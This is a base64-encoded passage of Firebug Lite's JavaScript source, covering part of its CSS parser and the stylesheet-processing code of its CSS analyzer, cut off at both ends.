ICAgICAgICAgICAgICAgaWYgKCFpbl9jb21tZW50ICYmIGNoMiA9PSAnKicpIHsgLy8gY29tbWVudCBzdGFydA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluX2NvbW1lbnQrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNhc2UgJyonOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNoMiA9PSAnLycpIHsgLy8gY29tbWVudCBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbl9jb21tZW50LS07DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNhc2UgJ3snOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFpbl9jb21tZW50KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVsZV9ib2R5X3N0YXJ0LnB1c2goaSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VyX3BhcmVudCA9IGN1cl9wYXJlbnQuYWRkQ2hpbGQocnVsZV9zdGFydC5wb3AoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhY2sucHVzaChjdXJfcGFyZW50KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNhc2UgJ30nOg0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gZm91bmQgdGhlIGVuZCBvZiB0aGUgcnVsZQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFpbl9jb21tZW50KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLyoqIEB0eXBlIHtydWxlfSAqLw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBsYXN0X3J1bGUgPSBzdGFjay5wb3AoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBydWxlX3N0YXJ0LnBvcCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RfcnVsZS5ib2R5X3N0YXJ0ID0gcnVsZV9ib2R5X3N0YXJ0LnBvcCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RfcnVsZS5lbmQgPSBpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cl9wYXJlbnQgPSBsYXN0X3J1bGUucGFyZW50IHx8IHJvb3Q7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIHJldHVybiBzYXZlTGluZU51bWJlcnModGV4dCwgcm9vdCwgbnVsbCwgc3RhcnRMaW5lKTsNCiAgICAgICAgfSwNCiAgICAgICAgDQogICAgICAgIG5vcm1hbGl6ZVNlbGVjdG9yOiBub3JtYWxpemVTZWxlY3RvciwNCiAgICAgICAgDQogICAgICAgIC8qKg0KICAgICAgICAgKiBGaW5kIG1hdGNoZWQgcnVsZSBieSBzZWxlY3Rvci4NCiAgICAgICAgICogQHBhcmFtIHtydWxlfSBydWxlX25vZGUgUGFyc2VkIHJ1bGUgbm9kZQ0KICAgICAgICAgKiBAcGFyYW0ge1N0cmluZ30gc2VsZWN0b3IgQ1NTIHNlbGVjdG9yDQogICAgICAgICAqIEBwYXJhbSB7U3RyaW5nfSBzb3VyY2UgQ1NTIHN0eWxlc2hlZXQgc291cmNlIGNvZGUNCiAgICAgICAgICogDQogICAgICAgICAqIEByZXR1cm4ge3J1bGVbXXxudWxsfSBBcnJheSBvZiBtYXRjaGVkIHJ1bGVzLCBzb3J0ZWQgYnkgcHJpb3JpdHkgKG1vc3QgDQogICAgICAgICAqIHJlY2VudCBvbiB0b3ApDQogICAgICAgICAqLw0KICAgICAgICBmaW5kQnlTZWxlY3RvcjogZnVuY3Rpb24ocnVsZV9ub2RlLCBzZWxlY3Rvciwgc291cmNlKSB7DQogICAgICAgICAgICB2YXIgc2VsZWN0b3IgPSBub3JtYWxpemVTZWxlY3RvcihzZWxlY3RvciksDQogICAgICAgICAgICAgICAgcmVzdWx0ID0gW107DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAocnVsZV9ub2RlKSB7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlsID0gcnVsZV9ub2RlLmNoaWxkcmVuLmxlbmd0aDsgaSA8IGlsOyBpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgLyoqIEB0eXBlIHtydWxlfSAqLw0KICAgICAgICAgICAgICAgICAgICB2YXIgciA9IHJ1bGVfbm9kZS5jaGlsZHJlbltpXTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHIuc2VsZWN0b3IgPT0gc2VsZWN0b3IpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdC5wdXNoKHIpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAocmVzdWx0Lmxlbmd0aCkgew0KICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfTsNCn0pKCk7DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZCTC5Dc3NQYXJzZXIgPSBDc3NQYXJzZXI7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gU3R5bGVTaGVldCBQYXJzZXINCg0KdmFyIENzc0FuYWx5emVyID0ge307DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gTG9jYWxzDQoNCnZhciBDU1NSdWxlTWFwID0ge307DQp2YXIgRWxlbWVudENTU1J1bGVzTWFwID0ge307DQoNCnZhciBpbnRlcm5hbFN0eWxlU2hlZXRJbmRleCA9IC0xOw0KDQp2YXIgcmVTZWxlY3RvclRhZyA9IC8oXnxccykoPzpcdyspL2c7DQp2YXIgcmVTZWxlY3RvckNsYXNzID0gL1wuW1x3XGRfLV0rL2c7DQp2YXIgcmVTZWxlY3RvcklkID0gLyNbXHdcZF8tXSsvZzsNCg0KdmFyIGdsb2JhbENTU1J1bGVJbmRleDsNCg0KdmFyIHByb2Nlc3NBbGxTdHlsZVNoZWV0c1RpbWVvdXQgPSBudWxsOw0KDQp2YXIgZXh0ZXJuYWxTdHlsZVNoZWV0VVJMcyA9IFtdOw0KDQp2YXIgRWxlbWVudENhY2hlID0gRmlyZWJ1Zy5MaXRlLkNhY2hlLkVsZW1lbnQ7DQp2YXIgU3R5bGVTaGVldENhY2hlID0gRmlyZWJ1Zy5MaXRlLkNhY2hlLlN0eWxlU2hlZXQ7DQoNCi8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBDU1MgQW5hbHl6ZXIgdGVtcGxhdGVzDQoNCkNzc0FuYWx5emVyLmV4dGVybmFsU3R5bGVTaGVldFdhcm5pbmcgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6DQogICAgICAgIERJVih7ImNsYXNzIjogIndhcm5pbmcgZm9jdXNSb3ciLCBzdHlsZTogImZvbnQtd2VpZ2h0Om5vcm1hbDsiLCByb2xlOiAnbGlzdGl0ZW0nfSwNCiAgICAgICAgICAgIFNQQU4oIiRvYmplY3R8U1RSIiksDQogICAgICAgICAgICBBKHsiaHJlZiI6ICIkaHJlZiIsIHRhcmdldDoiX2JsYW5rIn0sICIkbGlua3xTVFIiKQ0KICAgICAgICApDQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBDU1MgQW5hbHl6ZXIgbWV0aG9kcw0KDQpDc3NBbmFseXplci5wcm9jZXNzQWxsU3R5bGVTaGVldHMgPSBmdW5jdGlvbihkb2MsIHN0eWxlU2hlZXRJdGVyYXRvcikNCnsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIHByb2Nlc3NBbGxTdHlsZVNoZWV0cyhkb2MsIHN0eWxlU2hlZXRJdGVyYXRvcik7DQogICAgfQ0KICAgIGNhdGNoKGUpDQogICAgew0KICAgICAgICAvLyBUT0RPOiBGQlRyYWNlIGNvbmRpdGlvbg0KICAgICAgICBGQlRyYWNlLnN5c291dCgiQ3NzQW5hbHl6ZXIucHJvY2Vzc0FsbFN0eWxlU2hlZXRzIGZhaWxzOiAiLCBlKTsNCiAgICB9DQp9Ow0KDQovKioNCiAqIA0KICogQHBhcmFtIGVsZW1lbnQNCiAqIEByZXR1cm5zIHtTdHJpbmdbXX0gQXJyYXkgb2YgSURzIG9mIENTUyBSdWxlcw0KICovDQpDc3NBbmFseXplci5nZXRFbGVtZW50Q1NTUnVsZXMgPSBmdW5jdGlvbihlbGVtZW50KQ0Kew0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGdldEVsZW1lbnRDU1NSdWxlcyhlbGVtZW50KTsNCiAgICB9DQogICAgY2F0Y2goZSkNCiAgICB7DQogICAgICAgIC8vIFRPRE86IEZCVHJhY2UgY29uZGl0aW9uDQogICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJDc3NBbmFseXplci5nZXRFbGVtZW50Q1NTUnVsZXMgZmFpbHM6ICIsIGUpOw0KICAgIH0NCn07DQoNCkNzc0FuYWx5emVyLmdldFJ1bGVEYXRhID0gZnVuY3Rpb24ocnVsZUlkKQ0Kew0KICAgIHJldHVybiBDU1NSdWxlTWFwW3J1bGVJZF07DQp9Ow0KDQovLyBUT0RPOiBkbyB3ZSBuZWVkIHRoaXM/DQpDc3NBbmFseXplci5nZXRSdWxlTGluZSA9IGZ1bmN0aW9uKCkNCnsNCn07DQoNCkNzc0FuYWx5emVyLmhhc0V4dGVybmFsU3R5bGVTaGVldCA9IGZ1bmN0aW9uKCkNCnsNCiAgICByZXR1cm4gZXh0ZXJuYWxTdHlsZVNoZWV0VVJMcy5sZW5ndGggPiAwOw0KfTsNCg0KQ3NzQW5hbHl6ZXIucGFyc2VTdHlsZVNoZWV0ID0gZnVuY3Rpb24oaHJlZikNCnsNCiAgICB2YXIgc291cmNlRGF0YSA9IGV4dHJhY3RTb3VyY2VEYXRhKGhyZWYpOw0KICAgIHZhciBwYXJzZWRPYmogPSBDc3NQYXJzZXIucmVhZChzb3VyY2VEYXRhLnNvdXJjZSwgc291cmNlRGF0YS5zdGFydExpbmUpOw0KICAgIHZhciBwYXJzZWRSdWxlcyA9IHBhcnNlZE9iai5jaGlsZHJlbjsNCiAgICANCiAgICAvLyBTZWU6IElzc3VlIDQ3NzY6IFtGaXJlYnVnIGxpdGVdIENTUyBNZWRpYSBUeXBlcw0KICAgIC8vDQogICAgLy8gSWdub3JlIGFsbCBzcGVjaWFsIHNlbGVjdG9ycyBsaWtlIEBtZWRpYSBhbmQgQHBhZ2UNCiAgICBmb3IodmFyIGk9MDsgaSA8IHBhcnNlZFJ1bGVzLmxlbmd0aDsgKQ0KICAgIHsNCiAgICAgICAgaWYgKHBhcnNlZFJ1bGVzW2ldLnNlbGVjdG9yLmluZGV4T2YoIkAiKSAhPSAtMSkNCiAgICAgICAgew0KICAgICAgICAgICAgcGFyc2VkUnVsZXMuc3BsaWNlKGksIDEpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIGkrKzsNCiAgICB9DQogICAgDQogICAgcmV0dXJuIHBhcnNlZFJ1bGVzOw0KfTsNCg0KLy8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIEludGVybmFscw0KLy8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBTdHlsZVNoZWV0IHByb2Nlc3NpbmcNCg0KdmFyIHByb2Nlc3NBbGxTdHlsZVNoZWV0cyA9IGZ1bmN0aW9uKGRvYywgc3R5bGVTaGVldEl0ZXJhdG9yKQ0Kew0KICAgIHN0eWxlU2hlZXRJdGVyYXRvciA9IHN0eWxlU2hlZXRJdGVyYXRvciB8fCBwcm9jZXNzU3R5bGVTaGVldDsNCiAgICANCiAgICBnbG9iYWxDU1NSdWxlSW5kZXggPSAtMTsNCiAgICANCiAgICB2YXIgc3R5bGVTaGVldHMgPSBkb2Muc3R5bGVTaGVldHM7DQogICAgdmFyIGltcG9ydGVkU3R5bGVTaGVldHMgPSBbXTsNCiAgICANCiAgICBpZiAoRkJUcmFjZS5EQkdfQ1NTKQ0KICAgICAgICB2YXIgc3RhcnQgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTsNCiAgICANCiAgICBmb3IodmFyIGk9MCwgbGVuZ3RoPXN0eWxlU2hlZXRzLmxlbmd0aDsgaTxsZW5ndGg7IGkrKykNCiAgICB7DQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgc3R5bGVTaGVldCA9IHN0eWxlU2hlZXRzW2ldOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoImZpcmVidWdJZ25vcmUiIGluIHN0eWxlU2hlZXQpIGNvbnRpbnVlOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyB3ZSBtdXN0IHJlYWQgdGhlIGxlbmd0aCB0byBtYWtlIHN1cmUgd2UgaGF2ZSBwZXJtaXNzaW9uIHRvIHJlYWQgDQogICAgICAgICAgICAvLyB0aGUgc3R5bGVzaGVldCdzIGNvbnRlbnQuIElmIGFuIGVycm9yIG9jY3VycyBoZXJlLCB3ZSBjYW5ub3QgDQogICAgICAgICAgICAvLyByZWFkIHRoZSBzdHlsZXNoZWV0IGR1ZSB0byBhY2Nlc3MgcmVzdHJpY3Rpb24gcG9saWN5DQogICAgICAgICAgICB2YXIgcnVsZXMgPSBpc0lFID8gc3R5bGVTaGVldC5ydWxlcyA6IHN0eWxlU2hlZXQuY3NzUnVsZXM7DQogICAgICAgICAgICBydWxlcy5sZW5ndGg7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goZSkNCiAgICAgICAgew0KICAgICAgICAgICAgZXh0ZXJuYWxTdHlsZVNoZWV0VVJMcy5wdXNoKHN0eWxlU2hlZXQuaHJlZik7DQogICAgICAgICAgICBzdHlsZVNoZWV0LnJlc3RyaWN0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgdmFyIHNzaWQgPSBTdHlsZVNoZWV0Q2FjaGUoc3R5bGVTaGVldCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vLyBUT0RPOiB4eHhwZWRybyBleHRlcm5hbCBjc3MNCiAgICAgICAgICAgIC8vbG9hZEV4dGVybmFsU3R5bGVzaGVldChkb2MsIHN0eWxlU2hlZXRJdGVyYXRvciwgc3R5bGVTaGVldCk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIC8vIHByb2Nlc3MgaW50ZXJuYWwgYW5kIGV4dGVybmFsIHN0eWxlU2hlZXRzDQogICAgICAgIHN0eWxlU2hlZXRJdGVyYXRvcihkb2MsIHN0eWxlU2hlZXQpOw0KICAgICAgICANCiAgICAgICAgdmFyIGltcG9ydGVkU3R5bGVTaGVldCwgaW1wb3J0ZWRSdWxlczsNCiAgICAgICAgDQogICAgICAgIC8vIHByb2Nlc3MgaW1wb3J0ZWQgc3R5bGVTaGVldHMgaW4gSUUNCiAgICAgICAgaWYgKGlzSUUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBpbXBvcnRzID0gc3R5bGVTaGVldC5pbXBvcnRzOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBmb3IodmFyIGo9MCwgaW1wb3J0c0xlbmd0aD1pbXBvcnRzLmxlbmd0aDsgajxpbXBvcnRzTGVuZ3RoOyBqKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpbXBvcnRlZFN0eWxlU2hlZXQgPSBpbXBvcnRzW2pdOw0KICAgICAgICAgICAgICAgICAgICAvLyB3ZSBtdXN0IHJlYWQgdGhlIGxlbmd0aCB0byBtYWtlIHN1cmUgd2UgaGF2ZSBwZXJtaXNzaW9uDQogICAgICAgICAgICAgICAgICAgIC8vIHRvIHJlYWQgdGhlIGltcG9ydGVkIHN0eWxlc2hlZXQncyBjb250ZW50LiANCiAgICAgICAgICAgICAgICAgICAgaW1wb3J0ZWRSdWxlcyA9IGltcG9ydGVkU3R5bGVTaGVldC5ydWxlczsNCiAgICAgICAgICAgICAgICAgICAgaW1wb3J0ZWRSdWxlcy5sZW5ndGg7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoKGUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBleHRlcm5hbFN0eWxlU2hlZXRVUkxzLnB1c2goc3R5bGVTaGVldC5ocmVmKTsNCiAgICAgICAgICAgICAgICAgICAgaW1wb3J0ZWRTdHlsZVNoZWV0LnJlc3RyaWN0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB2YXIgc3NpZCA9IFN0eWxlU2hlZXRDYWNoZShpbXBvcnRlZFN0eWxlU2hlZXQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBzdHlsZVNoZWV0SXRlcmF0b3IoZG9jLCBpbXBvcnRlZFN0eWxlU2hlZXQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIC8vIHByb2Nlc3MgaW1wb3J0ZWQgc3R5bGVTaGVldHMgaW4gb3RoZXIgYnJvd3NlcnMNCiAgICAgICAgZWxzZSBpZiAocnVsZXMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvcih2YXIgaj0wLCBydWxlc0xlbmd0aD1ydWxlcy5sZW5ndGg7IGo8cnVsZXNMZW5ndGg7IGorKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBydWxlID0gcnVsZXNbal07DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpbXBvcnRlZFN0eWxlU2hlZXQgPSBydWxlLnN0eWxlU2hlZXQ7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoaW1wb3J0ZWRTdHlsZVNoZWV0KQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAvLyB3ZSBtdXN0IHJlYWQgdGhlIGxlbmd0aCB0byBtYWtlIHN1cmUgd2UgaGF2ZSBwZXJtaXNzaW9uDQogICAgICAgICAgICAgICAgICAgICAgICAvLyB0byByZWFkIHRoZSBpbXBvcnRlZCBzdHlsZXNoZWV0J3MgY29udGVudC4gDQogICAgICAgICAgICAgICAgICAgICAgICBpbXBvcnRlZFJ1bGVzID0gaW1wb3J0ZWRTdHlsZVNoZWV0LmNzc1J1bGVzOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW1wb3J0ZWRSdWxlcy5sZW5ndGg7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoKGUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBleHRlcm5hbFN0eWxlU2hlZXRVUkxzLnB1c2goc3R5bGVTaGVldC5ocmVmKTsNCiAgICAgICAgICAgICAgICAgICAgaW1wb3J0ZWRTdHlsZVNoZWV0LnJlc3RyaWN0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB2YXIgc3NpZCA9IFN0eWxlU2hlZXRDYWNoZShpbXBvcnRlZFN0eWxlU2hlZXQpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHN0eWxlU2hlZXRJdGVyYXRvcihkb2MsIGltcG9ydGVkU3R5bGVTaGVldCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9Ow0KICAgIA0KICAgIGlmIChGQlRyYWNlLkRCR19DU1MpDQogICAgew0KICAgICAgICBGQlRyYWNlLnN5c291dCgiRkJMLnByb2Nlc3NBbGxTdHlsZVNoZWV0cyIsICJhbGwgc3R5bGVzaGVldCBydWxlcyBwcm9jZXNzZWQgaW4gIiArIChuZXcgRGF0ZSgpLmdldFRpbWUoKSAtIHN0YXJ0KSArICJtcyIpOw0KICAgIH0NCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp2YXIgcHJvY2Vzc1N0eWxlU2hlZXQgPSBmdW5jdGlvbihkb2MsIHN0eWxlU2hlZXQpDQp7DQogICAgaWYgKHN0eWxlU2hlZXQucmVzdHJpY3RlZCkNCiAgICAgICAgcmV0dXJuOw0KICAgIA0KICAgIHZhciBydWxlcyA9IGlzSUUgPyBzdHlsZVNoZWV0LnJ1bGVzIDogc3R5bGVTaGVldC5jc3NSdWxlczsNCiAgICANCiAgICB2YXIgc3NpZCA9IFN0eWxlU2hlZXRDYWNoZShzdHlsZVNoZWV0KTsNCiAgICANCiAgICB2YXIgaHJlZiA9IHN0eWxlU2hlZXQuaHJlZjsNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gQ1NTIFBhcnNlcg0KICAgIHZhciBzaG91bGRQYXJzZUNTUyA9IHR5cGVvZiBDc3NQYXJzZXIgIT0gInVuZGVmaW5lZCIgJiYgIUZpcmVidWcuZGlzYWJsZVJlc291cmNlRmV0Y2hpbmc7DQogICAgaWYgKHNob3VsZFBhcnNlQ1NTKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYXJzZWRSdWxlcyA9IENzc0FuYWx5emVyLnBhcnNlU3R5bGVTaGVldChocmVmKTsgDQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goZSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUykgRkJUcmFjZS5zeXNvdXQoInByb2Nlc3NTdHlsZVNoZWV0IEZBSUxTIiwgZS5tZXNzYWdlIHx8IGUpOw0KICAgICAgICAgICAgc2hvdWxkUGFyc2VDU1MgPSBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBmaW5hbGx5DQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYXJzZWRSdWxlc0luZGV4ID0gMDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIGRvbnRTdXBwb3J0R3JvdXBlZFJ1bGVzID0gaXNJRSAmJiBicm93c2VyVmVyc2lvbiA8IDk7DQogICAgICAgICAgICB2YXIgZ3JvdXAgPSBbXTsNCiAgICAgICAgICAgIHZhciBncm91cEl0ZW07DQogICAgICAgIH0NCiAgICB9DQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGZvciAodmFyIGk9MCwgbGVuZ3RoPXJ1bGVzLmxlbmd0aDsgaTxsZW5ndGg7IGkrKykNCiAgICB7DQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIGlzIHRoZXJlIGEgYmV0dGVyIHdheSB0byBjYWNoZSBDU1MgUnVsZXM/IFRoZSBwcm9ibGVtIGlzIHRoYXQNCiAgICAgICAgLy8gd2UgY2Fubm90IGFkZCBleHBhbmRvIHByb3BlcnRpZXMgaW4gdGhlIHJ1bGUgb2JqZWN0IGluIElFDQogICAgICAgIHZhciByaWQgPSBzc2lkICsgIjoiICsgaTsNCiAgICAgICAgdmFyIHJ1bGUgPSBydWxlc1tpXTsNCiAgICAgICAgdmFyIHNlbGVjdG9yID0gcnVsZS5zZWxlY3RvclRleHQgfHwgIiI7DQogICAgICAgIHZhciBsaW5lTm8gPSBudWxsOw0KICAgICAgICANCiAgICAgICAgLy8gU2VlOiBJc3N1ZSA0Nzc2OiBbRmlyZWJ1ZyBsaXRlXSBDU1MgTWVkaWEgVHlwZXMNCiAgICAgICAgLy8NCiAgICAgICAgLy8gSWdub3JlIGFsbCBzcGVjaWFsIHNlbGVjdG9ycyBsaWtlIEBtZWRpYSBhbmQgQHBhZ2UNCiAgICAgICAgaWYgKCFzZWxlY3RvciB8fCBzZWxlY3Rvci5pbmRleE9mKCJAIikgIT0gLTEpDQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgDQogICAgICAgIGlmIChpc0lFKQ0KICAgICAgICAgICAgc2VsZWN0b3IgPSBzZWxlY3Rvci5yZXBsYWNlKHJlU2VsZWN0b3JUYWcsIGZ1bmN0aW9uKHMpe3JldHVybiBzLnRvTG93ZXJDYXNlKCk7fSk7DQogICAgICAgIA0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gQ1NTIFBhcnNlcg0KICAgICAgICBpZiAoc2hvdWxkUGFyc2VDU1MpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYXJzZWRSdWxlID0gcGFyc2VkUnVsZXNbcGFyc2VkUnVsZXNJbmRleF07DQogICAgICAgICAgICB2YXIgcGFyc2VkU2VsZWN0b3IgPSBwYXJzZWRSdWxlLnNlbGVjdG9yOw0KDQogICAgICAgICAgICBpZiAoZG9udFN1cHBvcnRHcm91cGVkUnVsZXMgJiYgcGFyc2VkU2VsZWN0b3IuaW5kZXhPZigiLCIpICE9IC0xICYmIGdyb3VwLmxlbmd0aCA9PSAwKQ0KICAgICAgICAgICAgICAgIGdyb3VwID0gcGFyc2VkU2VsZWN0b3Iuc3BsaXQoIiwiKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGRvbnRTdXBwb3J0R3JvdXBlZFJ1bGVzICYmIGdyb3VwLmxlbmd0aCA+IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZ3JvdXBJdGVtID0gZ3JvdXAuc2hpZnQoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoQ3NzUGFyc2VyLm5vcm1hbGl6ZVNlbGVjdG9yKHNlbGVjdG9yKSA9PSBncm91cEl0ZW0pDQogICAgICAgICAgICAgICAgICAgIGxpbmVObyA9IHBhcnNlZFJ1bGUubGluZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoZ3JvdXAubGVuZ3RoID09IDApDQogICAgICAgICAgICAgICAgICAgIHBhcnNlZFJ1bGVzSW5kZXgrKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKENzc1BhcnNlci5ub3JtYWxpemVTZWxlY3RvcihzZWxlY3RvcikgPT0gcGFyc2VkUnVsZS5zZWxlY3RvcikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBsaW5lTm8gPSBwYXJzZWRSdWxlLmxpbmU7DQogICAgICAgICAgICAgICAgcGFyc2VkUnVsZXNJbmRleCsrOw0KICAgICAgICAgICAgfQ0KICAgICAg